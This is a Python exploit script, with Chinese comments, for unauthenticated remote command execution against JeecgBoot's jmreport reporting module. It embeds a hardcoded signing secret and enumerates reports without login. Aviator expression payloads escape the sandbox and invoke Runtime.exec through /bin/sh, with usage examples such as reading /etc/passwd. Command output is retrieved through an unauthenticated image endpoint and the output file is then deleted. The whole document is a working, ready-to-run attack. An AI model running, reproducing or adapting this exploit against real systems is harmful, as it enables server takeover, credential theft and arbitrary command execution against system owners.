#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用法:
  python3 jmreport_rce.py "http://127.0.0.1/jeecgboot" "id"
  python3 jmreport_rce.py "http://127.0.0.1/jeecgboot" "cat /etc/passwd"
  python3 jmreport_rce.py "http://127.0.0.1/jeecgboot" "ls -la /"

流程(全自动):
  匿名枚举报表 -> 探测哪个报表会执行 Aviator 参数 -> Step1 引擎改造 x2
  -> Step2 Runtime.exec 执行命令,输出写到上传目录 -> 免登录 GET /jmreport/img/ 拉回回显

命令限制(传输层特性,必须遵守,脚本会校验):
  不允许 ; | & + = % 和单引号 ';多段命令请拆成多条依次执行
  例: id | grep root  → 分两次: "id"  + 单独再跑一次
"""
import json, sys, time, uuid, hashlib, urllib.request, urllib.error, re

PLUGIN_SECRET = "6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121"
ENDPOINT = "/jmreport/auto/export/python/plugin"
IMG_DIR = "/opt/upFiles/jimureport"          # 回显写入目录(默认上传根)
UPATH = "jimureport"                          # 对应 /jmreport/img/ 的相对路径
FORBIDDEN = set(";&|+='%\"")

STEP1 = ("for x in __instance__.features { seq.put(__instance__.funcMap, '_sm', x.declaringClass.enumConstants[16]); "
         "seq.put(__instance__.funcMap, '_fn', x.declaringClass.enumConstants[8]) }; "
         "seq.add(__instance__.features, seq.get(__instance__.funcMap, '_sm')); "
         "seq.add(__instance__.features, seq.get(__instance__.funcMap, '_fn')); "
         "seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); "
         "seq.put(__env__, 'FM', CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')); "
         "seq.put(__env__, 'RF', CC.forName('com.googlecode.aviator.utils.Reflector')); "
         "RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance())")

def exec_args_payload(*args):
    argstr = ", ".join("'%s'" % a for a in args)
    return ("seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); "
            "seq.put(__env__, 'opt', get(getField(CC.forName('com.googlecode.aviator.Options'), 'ALLOWED_CLASS_SET'), nil)); "
            "seq.put(__env__, 'st', seq.set(CC.forName('java.lang.String'))); "
            "setOption(__instance__, seq.get(__env__, 'opt'), seq.get(__env__, 'st')); "
            "seq.put(__env__, 'RT', CC.forName('java.lang.Runtime')); seq.put(__env__, 'r', RT.getRuntime()); "
            "seq.put(__env__, 'arr', seq.array(String, " + argstr + ")); "
            "seq.put(__env__, 'p', exec(seq.get(__env__, 'r'), seq.get(__env__, 'arr')))")

class Target:
    def __init__(self, base):
        self.base = base.rstrip("/")
    def post_plugin(self, report_id, param_expr):
        body = {"reportParams": [{"id": report_id, "params": {"k": "=" + param_expr},
                                  "exportType": "PDF"}], "exportType": "PDF"}
        raw = json.dumps(body, separators=(",", ":"))
        sign = hashlib.md5((raw + PLUGIN_SECRET).encode()).hexdigest().upper()
        req = urllib.request.Request(self.base + ENDPOINT, data=raw.encode(),
            headers={"Content-Type": "application/json", "X-Sign": sign,
                     "X-TIMESTAMP": str(int(time.time() * 1000))}, method="POST")
        try:
            r = urllib.request.urlopen(req, timeout=30)
            return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:
            return 0, "ERR %s" % e
    def get(self, path):
        try:
            req = urllib.request.Request(self.base + path, headers={"User-Agent": "Mozilla/5.0"})
            r = urllib.request.urlopen(req, timeout=15)
            return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")

def enum_reports(t):
    s, b = t.get("/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=8")
    if s != 200: return []
    try:
        recs = (json.loads(b).get("result") or {}).get("records") or []
        return [r.get("id") for r in recs if r.get("id")]
    except Exception:
        return []

def find_working_report(t, ids):
    """逐报表探测: 参数 '=no_such_fn_xyz()' 触发 'Function not found' 即该报表会执行 Aviator"""
    for rid in ids:
        s, b = t.post_plugin(rid, "no_such_fn_xyz()")
        if "Function not found" in b:
            return rid
    return None

def exploit(t, report_id, cmd):
    out_file = "jmout_%s.png" % uuid.uuid4().hex[:8]
    # 确保命令输出重定向到上传目录(命令本身不再含重定向时自动追加)
    shell_cmd = cmd if ">" in cmd else "%s > %s/%s" % (cmd, IMG_DIR, out_file)
    # 1) 探测热路径(也让探测失败的响应确认报表可用)
    t.post_plugin(report_id, "no_such_fn_xyz()"); time.sleep(0.3)
    # 2) Step1 引擎改造 x2
    t.post_plugin(report_id, STEP1); time.sleep(0.4)
    t.post_plugin(report_id, STEP1); time.sleep(0.4)
    # 3) Step2 执行命令
    s, b = t.post_plugin(report_id, exec_args_payload("/bin/sh", "-c", shell_cmd))
    time.sleep(1.5)
    # 4) 免登录拉回显
    url_path = "/jmreport/img/%s/%s" % (UPATH, out_file)
    s2, out = t.get(url_path)
    if s2 == 200 and out and "失败" not in out[:40]:
        print("[+] 命令输出:\n%s" % out.strip())
    else:
        print("[-] 未取到回显 (HTTP %s) —— 命令可能执行失败或输出为空" % s2)
        # 清理失败时也尝试删除
    t.post_plugin(report_id, exec_args_payload("/bin/rm", "-f", "%s/%s" % (IMG_DIR, out_file)))
    return out

def main():
    if len(sys.argv) < 2:
        print(__doc__); return
    base = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    bad = sorted(set(c for c in cmd if c in FORBIDDEN))
    if bad:
        print("[!] 命令含传输不安全字符: %s" % " ".join("'%s'" % c for c in bad))
        print("    不允许 ; | & + = % 和引号。请拆成简单命令执行,或用 > 重定向。")
        return
    t = Target(base)
    print("[*] 枚举报表...")
    ids = enum_reports(t)
    if not ids:
        print("[-] 枚举失败,请确认目标可达且为 JeecgBoot+jmreport"); return
    print("[*] 候选报表: %s" % ", ".join(ids[:5]))
    rid = find_working_report(t, ids)
    if not rid:
        print("[-] 未找到会执行 Aviator 参数的报表(尝试前 8 个)。可手动指定: 脚本内改 report_id"); return
    print("[+] 可用报表: %s" % rid)
    print("[*] 执行: %s" % cmd)
    exploit(t, rid, cmd)

if __name__ == "__main__":
    main()
